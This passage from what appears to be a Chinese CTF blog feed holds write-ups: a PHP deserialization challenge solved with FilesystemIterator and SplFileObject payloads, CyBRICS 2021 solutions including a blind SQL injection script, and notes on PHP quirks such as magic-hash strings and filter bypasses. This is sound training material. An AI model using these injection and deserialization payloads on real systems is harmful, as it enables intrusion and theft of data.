class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> XMAN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥æ˜¯phpååºåˆ—åŒ–é¢˜ã€‚</p><p>å¯åˆ©ç”¨ç‚¹åªæœ‰<code>echo new  $this-&gt;class ($this-&gt;para);</code>ã€‚</p><p>åº”è¯¥æ˜¯åˆ©ç”¨phpåŸç”Ÿç±»è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚</p><p>åˆ©ç”¨FilessystemIteratorç±»æŸ¥çœ‹ç›®å½•æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> XMAN();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806122559447.png"></p><p>æ‹¿åˆ°äº†flagæ–‡ä»¶åã€‚</p><p>åˆ©ç”¨SplFileObjectåŸç”Ÿç±»æŸ¥çœ‹æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn/f1a4.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> XMAN();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806122723103.png"></p><p>æ‹¿åˆ°flagã€‚</p><blockquote><p>flag{928erf51ab894a64f7865cf3c2128b34}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ç­¾åˆ°&quot;&gt;&lt;a href=&quot;#ç­¾åˆ°&quot; class=&quot;headerlink&quot; title=&quot;ç­¾åˆ°&quot;&gt;&lt;/a&gt;ç­¾åˆ°&lt;/h2&gt;&lt;p&gt;åŸºç¡€é¢˜&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/R1ta_Violet/blogimg/raw/master/</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://lucifer-rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CyBRICS2021éƒ¨åˆ†WriteUp</title>
    <link href="https://lucifer-rossweisse.github.io/2021/08/03/WriteUp/CyBRICS2021/"/>
    <id>https://lucifer-rossweisse.github.io/2021/08/03/WriteUp/CyBRICS2021/</id>
    <published>2021-08-03T09:21:27.000Z</published>
    <updated>2021-08-03T09:23:10.414Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ad-NetWork"><a href="#Ad-NetWork" class="headerlink" title="Ad NetWork"></a>Ad NetWork</h3><h4 id="é‡å®šå‘å¥—å¨ƒ"><a href="#é‡å®šå‘å¥—å¨ƒ" class="headerlink" title="é‡å®šå‘å¥—å¨ƒ"></a>é‡å®šå‘å¥—å¨ƒ</h4><p>ç©¶ææ— æ•Œæœ‰ç‚¹çƒ¦ä¹‹é‡å®šå‘å¥—å¨ƒï¼Œå†™ä¸ªè„šæœ¬è®©å®ƒè‡ªå·±è·‘ç®—äº†ï¼Œç”¨curlä¼šèˆ’æœç‚¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://dream.adnetwork-cybrics2021.ctf.su/bit-wait-admit-artist-deal/might-inside-toward-suddenly-watch/rich-outside-arrive/character-possible-easy&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$url</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS,<span class="number">3000</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$output</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (curl_errno(<span class="variable">$ch</span>) == CURLE_OPERATION_TIMEDOUT) &#123;</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$url</span> = explode(<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$output</span>)[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çˆ†åˆ°1337å°±èƒ½å‡ºflagäº†ã€‚</p><blockquote><p>cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}</p></blockquote><h3 id="Announcement"><a href="#Announcement" class="headerlink" title="Announcement"></a>Announcement</h3><h4 id="ç®€å•sqlæ³¨å…¥"><a href="#ç®€å•sqlæ³¨å…¥" class="headerlink" title="ç®€å•sqlæ³¨å…¥"></a>ç®€å•sqlæ³¨å…¥</h4><p>åŸºæœ¬æ²¡banä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯è¦æ³¨æ„ä¸€ä¸‹éœ€è¦md5ç¼–ç ï¼Œç›´æ¥å†™è„šæœ¬ç›²æ³¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://announcement-cybrics2021.ctf.su/&quot;</span></span><br><span class="line"><span class="comment"># sql = &quot;select database()&quot;  # announcement</span></span><br><span class="line"><span class="comment"># sql = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;  # emails,logs</span></span><br><span class="line"><span class="comment"># sql = &quot;select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;emails&#x27;&quot;  # email,id,timestamp</span></span><br><span class="line"><span class="comment"># sql = &quot;select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;logs&#x27;&quot;  # log</span></span><br><span class="line">sql = <span class="string">&quot;select * from logs&quot;</span>  <span class="comment"># flag  cybrics&#123;1N53r7_0ld_900d_5ql&#125;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">f&quot;&#x27; or if((ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),1,cot(0)), NOW()) #&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;digest&quot;</span>: md5(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(),</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;cot&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(f&quot;[*]New left is: &#123;left&#125; and right is: &#123;right&#125;&quot;)</span></span><br><span class="line">    result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºflag</p><blockquote><p>cybrics{1N53r7_0ld_900d_5ql}</p></blockquote><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h3><p>æ¯å¼ å›¾ç‰‡éƒ½æ˜¯æ”¹è¿‡LSBçš„ï¼Œç”¨Stegsolveå°±å¯ä»¥çœ‹åˆ°CAPTCHAï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªè¾“å°±è¡Œäº†ã€‚(åº”è¯¥æœ‰æ›´åŠ ä¾¿æ·çš„è§£æ³•ï¼Œæˆ‘è¿™çº¯å±è½</p><p>èµ›åå“å“¥ç»™äº†ä¸ªåˆ†è§£é¢œè‰²çš„<code>python</code>äº¤äº’å¼è„šæœ¬ï¼Œå®åœ¨æ˜¯å¤ªå¦™äº†ï¼Œæ„Ÿè§‰è‡ªå·±è¿˜æ˜¯æœ‰å¾ˆå¤šå¯¹äºmiscçš„çŸ¥è¯†ç‚¹ä¸å¤§æ˜ç™½çš„(è¿˜éœ€æå‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># bit planes codes are from https://medium.com/@stephanie.werli/image-steganography-with-python-83381475da57</span></span><br><span class="line"><span class="comment"># Interactive Script</span></span><br><span class="line"></span><br><span class="line">session = requests.Client(proxies=&#123;</span><br><span class="line">    <span class="string">&quot;http://&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    image = session.get(<span class="string">&quot;https://captf-cybrics2021.ctf.su/captcha.php&quot;</span>).content</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;./tmp.png&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    file.write(image)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line">    data = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;./tmp.png&quot;</span>, <span class="string">&quot;r&quot;</span>))</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        res = data // <span class="number">2</span> ** k &amp; <span class="number">1</span></span><br><span class="line">        out.append(res * <span class="number">255</span>)</span><br><span class="line">    b = np.hstack(out)</span><br><span class="line">    Image.fromarray(b).show()</span><br><span class="line"></span><br><span class="line">    captcha = <span class="built_in">input</span>(<span class="string">&quot;Enter the captcha you have seen in the window:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(<span class="string">&quot;https://captf-cybrics2021.ctf.su/&quot;</span>, data=&#123;<span class="string">&quot;answer&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;captcha&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">f&quot;[*] Hand up failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(<span class="string">f&quot;[+] Handed up <span class="subst">&#123;captcha&#125;</span> with response <span class="subst">&#123;response.content.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><h4 id="äºŒç»´ç æ‹¼æ¥ç±»å‹é¢˜"><a href="#äºŒç»´ç æ‹¼æ¥ç±»å‹é¢˜" class="headerlink" title="äºŒç»´ç æ‹¼æ¥ç±»å‹é¢˜"></a>äºŒç»´ç æ‹¼æ¥ç±»å‹é¢˜</h4><p>å†™ä¸ªè„šæœ¬å¤åŸå°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">nl = <span class="number">0</span></span><br><span class="line">newImage = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">989</span>, <span class="number">162</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">145</span>, <span class="number">3</span>):</span><br><span class="line">    print(<span class="string">&quot;[+]New is: ./gif/IMG00%03d.bmp&quot;</span> % i)</span><br><span class="line">    image = Image.<span class="built_in">open</span>((<span class="string">&#x27;./gif/IMG00%03d.bmp&#x27;</span> % i))</span><br><span class="line">    splice = image.crop((<span class="number">46</span>, <span class="number">496</span>, <span class="number">1036</span>, <span class="number">502</span>))</span><br><span class="line">    newImage.paste(splice, (<span class="number">0</span>, nl))</span><br><span class="line">    nl += <span class="number">6</span></span><br><span class="line"></span><br><span class="line">newImage = newImage.resize((<span class="number">500</span>, <span class="number">500</span>))</span><br><span class="line">newImage.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>æœ€åä¸€å¼ æ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«ä¸€æ‰«å‡ºflagã€‚</p><blockquote><p>cybrics{N0w_Y0u_4r3_4_c4sh13r_LOL}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;Ad-NetWork&quot;&gt;&lt;a href=&quot;#Ad-NetWork&quot; class=&quot;headerlink&quot; title=&quot;A</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://lucifer-rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHPç‰¹æ€§</title>
    <link href="https://lucifer-rossweisse.github.io/2021/07/23/web%E5%AD%A6%E4%B9%A0/PHP%E7%89%B9%E6%80%A7/"/>
    <id>https://lucifer-rossweisse.github.io/2021/07/23/web%E5%AD%A6%E4%B9%A0/PHP%E7%89%B9%E6%80%A7/</id>
    <published>2021-07-23T02:56:00.000Z</published>
    <updated>2021-07-23T03:26:09.452Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å„ä¸ªå‡½æ•°"><a href="#å„ä¸ªå‡½æ•°" class="headerlink" title="å„ä¸ªå‡½æ•°"></a>å„ä¸ªå‡½æ•°</h2><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><blockquote><p>intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚<br>æˆåŠŸæ—¶è¿”å› var çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚</p></blockquote><p>tips: æ•°ç»„å¯ä»¥ç”¨äºå¾—åˆ°trueã€‚å¯ä»¥è¯†åˆ«ç§‘å­¦è®¡æ•°æ³•ã€‚</p><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><blockquote><p>in_array ( mixed $needle , array $haystack , bool $strict = false ) : bool<br>åœ¨å¤§æµ·ï¼ˆhaystackï¼‰ä¸­æœç´¢é’ˆï¼ˆ needleï¼‰,å¦‚æœæ‰¾åˆ° needle åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p></blockquote><p>å¦‚æœªè®¾ç½®strictï¼Œåˆ™ä¸ºå¼±æ¯”è¾ƒã€‚</p><h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext() / _()"></a>gettext() / _()</h3><p>åœ¨å½“å‰åŸŸä¸­æŸ¥æ‰¾æ¶ˆæ¯ã€‚</p><p>tips: å”¯ä¸€ä¸€ä¸ªæœ‰åˆ«åçš„å‡½æ•°ã€‚</p><h3 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h3><p>%00æˆªæ–­æ¼æ´ã€‚</p><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>æ— æ³•å¤„ç†æ•°ç»„ã€‚</p><p>æœ‰å›æº¯æ¬¡æ•°ä¸Šé™ï¼ŒPHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limitã€‚</p><p>å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚</p><h3 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h3><p>æ— æ³•å¤„ç†æ•°ç»„ã€‚</p><h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h3><p>æ— æ³•å¤„ç†æ•°ç»„ã€‚</p><h2 id="phpç‰¹æ€§"><a href="#phpç‰¹æ€§" class="headerlink" title="phpç‰¹æ€§"></a>phpç‰¹æ€§</h2><h3 id="å“ˆå¸Œå€¼å¤„ç†"><a href="#å“ˆå¸Œå€¼å¤„ç†" class="headerlink" title="å“ˆå¸Œå€¼å¤„ç†"></a>å“ˆå¸Œå€¼å¤„ç†</h3><blockquote><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p></blockquote><p>å¸¸è§0eå¼€å¤´çš„å“ˆå¸Œå€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"> sha1(str)</span><br><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>)  </span><br><span class="line">sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>)</span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>)</span><br><span class="line">sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="ä¼˜å…ˆçº§é—®é¢˜"><a href="#ä¼˜å…ˆçº§é—®é¢˜" class="headerlink" title="ä¼˜å…ˆçº§é—®é¢˜"></a>ä¼˜å…ˆçº§é—®é¢˜</h3><p>and å’Œ &amp;&amp; éƒ½è¡¨ç¤ºé€»è¾‘ä¸ï¼Œor å’Œ || éƒ½è¡¨ç¤ºé€»è¾‘æˆ–ï¼Œä½†æ˜¯ä¼˜å…ˆçº§ä¸åŒï¼Œ&amp;&amp; &gt; â€˜=â€™ &gt; andï¼Œ|| &gt; â€˜=â€™ &gt; orã€‚</p><p>tips: æ³¨æ„and å’Œ = çš„ä½ç½®ã€‚</p><h3 id="phpåŸç”Ÿç±»"><a href="#phpåŸç”Ÿç±»" class="headerlink" title="phpåŸç”Ÿç±»"></a>phpåŸç”Ÿç±»</h3><h4 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h4><p>å¯ä»¥æ˜¾ç¤ºå‡ºä¸€ä¸ªç±»çš„ç›¸å…³ä¿¡æ¯ã€‚</p><h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>å¯ä»¥è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p><h3 id="å­—ç¬¦ä¸²è§£æ"><a href="#å­—ç¬¦ä¸²è§£æ" class="headerlink" title="å­—ç¬¦ä¸²è§£æ"></a>å­—ç¬¦ä¸²è§£æ</h3><p>phpåœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ é™¤ç©ºç™½ç¬¦ï¼Œæˆ–å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</p><p><a href="https://www.freebuf.com/articles/web/213359.html">å…·ä½“bypassçœ‹è¿™</a></p><h3 id="é€»è¾‘ä¸æˆ–è¿ç®—åˆ¤æ–­"><a href="#é€»è¾‘ä¸æˆ–è¿ç®—åˆ¤æ–­" class="headerlink" title="é€»è¾‘ä¸æˆ–è¿ç®—åˆ¤æ–­"></a>é€»è¾‘ä¸æˆ–è¿ç®—åˆ¤æ–­</h3><blockquote><p>å¯¹äºâ€œä¸â€ï¼ˆ&amp;&amp;ï¼‰ è¿ç®—ï¼š x &amp;&amp; y å½“xä¸ºfalseæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyï¼› å¯¹äºâ€œæˆ–â€ï¼ˆ||ï¼‰ è¿ç®— ï¼š x||y 